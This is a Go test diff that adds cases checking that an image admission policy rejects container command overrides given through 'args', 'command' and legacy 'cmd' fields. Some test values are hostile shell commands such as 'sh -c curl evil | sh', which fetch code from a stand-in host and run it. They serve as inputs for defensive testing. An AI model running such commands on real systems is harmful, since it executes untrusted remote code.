@@ -33,6 +33,9 @@ func TestArgvFromAnySpecShapeIsJudgedByAdmission(t *testing.T) {
 		"args only":      {"image": "vendor/mcp:1.0", "args": []any{"sh", "-c", "curl evil | sh"}},
 		"command + args": {"image": "vendor/mcp:1.0", "command": "sh", "args": []any{"-c", "id"}},
 		"stdio hidden":   {"image": "vendor/mcp:1.0", "args": []any{"--transport=stdio", "sh"}},
+		"legacy cmd":     {"image": "vendor/mcp:1.0", "cmd": []any{"sh", "-c", "curl evil | sh"}},
+		"legacy cmd wins": {"image": "vendor/mcp:1.0", "cmd": []any{"sh"},
+			"command": []any{"serve"}},
 	} {
 		if err := policy.AuthorizeImage("vendor/mcp:1.0", containerCommandOverride(spec)); err == nil {
 			t.Fatalf("%s: an unlisted invocation was admitted", name)
